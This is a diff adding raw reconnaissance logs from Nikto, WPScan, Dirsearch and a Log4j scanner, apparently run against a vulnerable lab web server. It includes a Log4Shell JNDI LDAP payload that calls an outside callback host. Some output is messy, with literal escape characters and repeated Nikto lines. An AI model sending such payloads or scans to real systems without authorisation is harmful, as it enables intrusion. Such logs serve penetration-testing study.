@@ -1,0 +1,112 @@
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          172.23.101.159
++ Target Hostname:    172.23.101.159
++ Target Port:        80
++ Start Time:         2022-05-21 15:00:16 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.8 (Ubuntu) DAV/2
++ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ /phpinfo.php: Output from the phpinfo() function was found.
++ OSVDB-3268: /doc/: Directory indexing found.
++ OSVDB-48: /doc/: The /doc/ directory is browsable. This may be /usr/doc.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 92462, size: 40540, mtime: Tue Dec  9 18:24:00 2008
++ OSVDB-3092: /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3268: /test/: Directory indexing found.
++ OSVDB-3092: /test/: This might be interesting...
++ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpMyAdmin/: phpMyAdmin directory found
++ OSVDB-3092: /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3092: /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ 8726 requests: 0 error(s) and 27 item(s) reported on remote host
++ End Time:           2022-05-21 15:00:55 (GMT1) (39 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+wpscan --url 172.23.101.159/ --enumerate u,t,p | tee wpscan-enum-172.23.101.159-80.tx
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+
+Scan Aborted: The remote website is up, but does not seem to be running WordPress.
+
+Dirsearch started Mon May 23 15:53:40 2022 as: dirsearch.py -l httpx.txt -o dirsearch.txt\n\n403   298B   
+http://172.22.201.155:80/.ht_wsr.txt 403   301B   
+http://172.22.201.155:80/.htaccess.bak1 403   301B   
+http://172.22.201.155:80/.htaccess.orig 403   303B   
+http://172.22.201.155:80/.htaccess.sample 403   301B   
+http://172.22.201.155:80/.htaccess_orig 403   301B   
+http://172.22.201.155:80/.htaccess.save 403   299B   
+http://172.22.201.155:80/.htaccess_sc 403   300B   
+http://172.22.201.155:80/.htaccessOLD2 403   299B   
+http://172.22.201.155:80/.htaccessOLD 403   302B   
+http://172.22.201.155:80/.htaccess_extra 403   291B   
+http://172.22.201.155:80/.htm 403   299B   
+http://172.22.201.155:80/.htaccessBAK 403   297B   
+http://172.22.201.155:80/.htpasswds 403   292B   
+http://172.22.201.155:80/.html 403   301B   
+http://172.22.201.155:80/.htpasswd_test 403   298B   
+http://172.22.201.155:80/.httr-oauth 403   295B   
+http://172.22.201.155:80/cgi-bin/ 200   111KB  
+http://172.22.201.155:80/doc/ 302     0B   
+http://172.22.201.155:80/dvwa/    -> REDIRECTS TO: login.php 200   891B   
+http://172.22.201.155:80/index.php 200   891B   
+http://172.22.201.155:80/index 200   891B   
+http://172.22.201.155:80/index.php/login/ 200    24KB  
+http://172.22.201.155:80/mutillidae/ 200    49KB  
+http://172.22.201.155:80/phpinfo\n200    49KB  
+http://172.22.201.155:80/phpinfo.php\n301   326B   
+http://172.22.201.155:80/phpMyAdmin    -> REDIRECTS TO: http://172.22.201.155/phpMyAdmin/\n200     4KB  
+http://172.22.201.155:80/phpMyAdmin/\n200     4KB  
+http://172.22.201.155:80/phpMyAdmin/index.php\n403   300B   
+http://172.22.201.155:80/server-status\n403   301B   
+http://172.22.201.155:80/server-status/\n301   320B   
+http://172.22.201.155:80/test    -> REDIRECTS TO: http://172.22.201.155/test/\n200   885B   
+http://172.22.201.155:80/test/\n301   324B   http://172.22.201.155:80/tikiwiki    -> REDIRECTS TO: http://172.22.201.155/tikiwiki/
+
+
+CVE-2021-44228 - Apache Log4j RCE 
+Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
+Secure your External Attack Surface with FullHunt.io.\r\n[\xe2\x80\xa2] 
+Initiating DNS callback server (interact.sh).
+Checking for Log4j RCE CVE-2021-44228.
+URL: http://172.23.101.159
+URL: http://172.23.101.159 
+PAYLOAD: ${jndi:ldap://172.23.101.159.650rr10199fj4w0g8km77w94o8911498u.interact.sh/64l2j30}
+EXCEPTION: [Errno 2] No such file or directory: 'headers.txt'\r\n[\xe2\x80\xa2] Payloads sent to all URLs.
+Waiting for DNS OOB callbacks.\r\n[\xe2\x80\xa2] Waiting...\r\n[\xe2\x80\xa2] 
+Targets do not seem to be vulnerable.
+Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 92462, size: 40540, mtime: Tue Dec  9 18:24:00 2008\r\n+ 
+OSVDB-3092: /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+OSVDB-3268: /test/: Directory indexing found.
+OSVDB-3092: /test/: This might be interesting
+OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+OSVDB-3268: /icons/: Directory indexing found.\r\n+ OSVDB-3233: /icons/README: Apache default file found.
+/phpMyAdmin/: phpMyAdmin directory found\r\n+ OSVDB-3092: /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\r\n+ OSVDB-3092: /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\r\n+ 8726 requests: 0 error(s) and 27 item(s) reported on remote host\
